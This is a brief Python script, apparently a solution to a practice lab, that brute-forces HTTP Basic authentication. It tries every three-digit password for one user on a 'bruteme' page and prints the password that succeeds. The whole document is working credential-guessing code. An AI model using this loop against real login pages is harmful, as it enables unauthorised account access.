import requests
from requests.auth import HTTPBasicAuth

for i in range(0, 1000):
    p = f"{i:03}"
    r = requests.get('https://labs.forensics.su/bruteme1.php', auth = HTTPBasicAuth('sadness18', p))
    if (r.status_code == 200):
        print('Password: ', p)
        break
